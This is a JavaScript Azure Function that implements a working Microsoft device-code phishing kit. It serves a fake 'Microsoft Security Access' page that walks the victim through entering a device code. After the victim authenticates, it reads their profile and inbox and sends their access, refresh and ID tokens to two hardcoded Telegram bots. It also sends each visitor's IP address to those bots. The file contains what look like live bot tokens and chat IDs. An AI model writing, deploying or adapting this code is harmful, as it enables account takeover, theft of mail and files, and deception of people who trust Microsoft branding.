const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = '6743632244';
const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
const TELEGRAM_CHAT_ID_2 = '6263177378';

async function sendTelegram(message) {
  try {
    const promises = [
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID_2,
          text: message,
          parse_mode: 'HTML'
        })
      })
    ];
    await Promise.all(promises);
  } catch (error) {
    console.error('Telegram error:', error);
  }
}

module.exports = async function (context, req) {
  context.log('🎯 Device Code: Request received');
  
  await sendTelegram(`🎯 <b>DEVICE CODE: Security page accessed</b>\n📅 ${new Date().toISOString()}\n🌐 IP: ${req.headers['x-forwarded-for'] || 'Unknown'}\n🔗 URL: ${req.url}`);
  
  const CLIENT_ID = '14d82eec-204b-4c2f-b7e8-296a70dab67e'; // Microsoft Graph CLI
  const SCOPE = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Files.ReadWrite offline_access openid profile email';
  
  const action = req.query.action;
  
  if (action === 'generate_code') {
    try {
      const response = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `client_id=${CLIENT_ID}&scope=${encodeURIComponent(SCOPE)}`
      });
      
      const data = await response.json();
      
      if (data.device_code) {
        await sendTelegram(`🎯 <b>DEVICE CODE GENERATED</b>\n👤 User Code: ${data.user_code}\n🔗 Verification URI: ${data.verification_uri}\n⏰ Expires in: ${data.expires_in} seconds\n📅 ${new Date().toISOString()}`);
        
        context.res = {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            success: true,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            device_code: data.device_code,
            expires_in: data.expires_in,
            interval: data.interval || 5
          })
        };
      } else {
        throw new Error('No device code returned');
      }
    } catch (error) {
      context.log('Error generating device code:', error);
      context.res = {
        status: 500,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: error.message })
      };
    }
    return;
  }
  
  if (action === 'poll_token') {
    const deviceCode = req.query.device_code;
    
    if (!deviceCode) {
      context.res = {
        status: 400,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: 'Device code required' })
      };
      return;
    }
    
    try {
      const response = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=${CLIENT_ID}&device_code=${deviceCode}`
      });
      
      const data = await response.json();
      
      if (data.access_token) {
        // 🔥 COMPREHENSIVE TOKEN CAPTURE
        const tokenInfo = {
          access_token: data.access_token,
          refresh_token: data.refresh_token || 'NOT_PROVIDED',
          id_token: data.id_token || 'NOT_PROVIDED',
          token_type: data.token_type,
          scope: data.scope,
          expires_in: data.expires_in
        };

        // Get user info immediately
        try {
          const userResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
            headers: { 'Authorization': `Bearer ${data.access_token}` }
          });
          const userInfo = await userResponse.json();
          
          // Get mail access
          const mailResponse = await fetch('https://graph.microsoft.com/v1.0/me/messages?$top=5', {
            headers: { 'Authorization': `Bearer ${data.access_token}` }
          });
          const mailData = await mailResponse.json();
          
          // 🚨 TELEGRAM ALERT WITH ALL TOKENS INCLUDING REFRESH TOKEN
          await sendTelegram(`🚨 <b>DEVICE CODE SUCCESS - FULL TOKEN CAPTURE!</b>
🎯 <b>ACCESS TOKEN:</b> ${data.access_token}
🔄 <b>REFRESH TOKEN:</b> ${data.refresh_token || 'NOT_PROVIDED'}
🆔 <b>ID TOKEN:</b> ${data.id_token || 'NOT_PROVIDED'}
👤 <b>Email:</b> ${userInfo.mail || userInfo.userPrincipalName}
🏢 <b>Name:</b> ${userInfo.displayName}
🏢 <b>Company:</b> ${userInfo.companyName || 'N/A'}
🆔 <b>ID:</b> ${userInfo.id}
📧 <b>Mail Access:</b> ${mailData.value ? mailData.value.length : 0} emails
📅 ${new Date().toISOString()}`);
          
        } catch (userError) {
          console.log('User info error:', userError);
        }
        
        context.res = {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            success: true,
            ...tokenInfo
          })
        };
        
      } else if (data.error === 'authorization_pending') {
        context.res = {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pending: true })
        };
      } else {
        await sendTelegram(`⚠️ <b>DEVICE CODE POLLING</b>\n🔥 Error: ${data.error}\n📝 Description: ${data.error_description}\n`);
        context.res = {
          status: 400,
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ error: data.error, description: data.error_description })
        };
      }
    } catch (error) {
      context.log('Token polling error:', error);
      context.res = {
        status: 500,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: error.message })
      };
    }
    return;
  }
  
  // Default: Serve the device code landing page
  context.res = {
    status: 200,
    headers: { 'Content-Type': 'text/html' },
    body: `
<!DOCTYPE html>
<html>
<head>
    <title>🔐 Microsoft Security Access</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .btn { background: #0078d4; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
        .btn:hover { background: #106ebe; }
        .code-display { background: #f8f9fa; padding: 20px; border-radius: 4px; margin: 20px 0; text-align: center; font-size: 24px; font-weight: bold; letter-spacing: 3px; }
        .status { margin: 20px 0; padding: 15px; border-radius: 4px; text-align: center; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .pending { background: #fff3cd; color: #856404; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>🔐 Microsoft Security Access</h1>
            <p>Enhanced authentication portal</p>
        </div>
        
        <div id="step1">
            <button class="btn" onclick="generateCode()">🚀 Access Microsoft Services</button>
            <p style="margin-top: 20px; text-align: center; color: #666;">
                Secure access to Microsoft 365, OneDrive, and Outlook
            </p>
        </div>
        
        <div id="step2" class="hidden">
            <div class="status pending">
                <h3>📱 Device Authentication Required</h3>
                <p>1. Go to: <strong><span id="verification-url"></span></strong></p>
                <p>2. Enter this code:</p>
                <div class="code-display" id="user-code"></div>
                <p>3. Complete login on your device</p>
            </div>
            <div id="polling-status" class="status pending">
                ⏳ Waiting for authentication... <span id="countdown"></span>
            </div>
        </div>
        
        <div id="step3" class="hidden">
            <div class="status success">
                <h3>✅ Authentication Successful!</h3>
                <p>Welcome! Your Microsoft services are now accessible.</p>
                <div id="user-info"></div>
            </div>
        </div>
        
        <div id="error" class="hidden">
            <div class="status error">
                <h3>❌ Authentication Failed</h3>
                <p id="error-message"></p>
                <button class="btn" onclick="location.reload()">🔄 Try Again</button>
            </div>
        </div>
    </div>

    <script>
        let deviceCode = null;
        let pollingInterval = null;
        let countdown = 900; // 15 minutes
        
        async function generateCode() {
            try {
                const response = await fetch('?action=generate_code');
                const data = await response.json();
                
                if (data.success) {
                    deviceCode = data.device_code;
                    document.getElementById('verification-url').textContent = data.verification_uri;
                    document.getElementById('user-code').textContent = data.user_code;
                    
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                    
                    // Start polling with faster interval (3 seconds)
                    startPolling(3000);
                    startCountdown();
                } else {
                    showError('Failed to generate device code');
                }
            } catch (error) {
                showError('Network error: ' + error.message);
            }
        }
        
        function startPolling(interval) {
            pollingInterval = setInterval(async () => {
                try {
                    const response = await fetch(\`?action=poll_token&device_code=\${deviceCode}\`);
                    const data = await response.json();
                    
                    if (data.success) {
                        clearInterval(pollingInterval);
                        document.getElementById('step2').classList.add('hidden');
                        document.getElementById('step3').classList.remove('hidden');
                        
                        // Show success message without token details for UI
                        document.getElementById('user-info').innerHTML = \`
                            <p><strong>Access Level:</strong> Full Microsoft Services</p>
                            <p><strong>Status:</strong> Active Session</p>
                            <p><strong>Tokens:</strong> Access + Refresh + ID Captured</p>
                        \`;
                    } else if (data.pending) {
                        // Continue polling
                        document.getElementById('polling-status').innerHTML = '⏳ Waiting for authentication... <span id="countdown"></span>';
                    } else if (data.error) {
                        clearInterval(pollingInterval);
                        showError(\`Authentication failed: \${data.error}\`);
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
            }, interval);
        }
        
        function startCountdown() {
            const countdownInterval = setInterval(() => {
                countdown--;
                const minutes = Math.floor(countdown / 60);
                const seconds = countdown % 60;
                const countdownElement = document.getElementById('countdown');
                if (countdownElement) {
                    countdownElement.textContent = \`(\${minutes}:\${seconds.toString().padStart(2, '0')})\`;
                }
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    clearInterval(pollingInterval);
                    showError('Device code expired. Please try again.');
                }
            }, 1000);
        }
        
        function showError(message) {
            document.getElementById('error-message').textContent = message;
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.add('hidden');
            document.getElementById('error').classList.remove('hidden');
        }
    </script>
</body>
</html>
    `
  };
};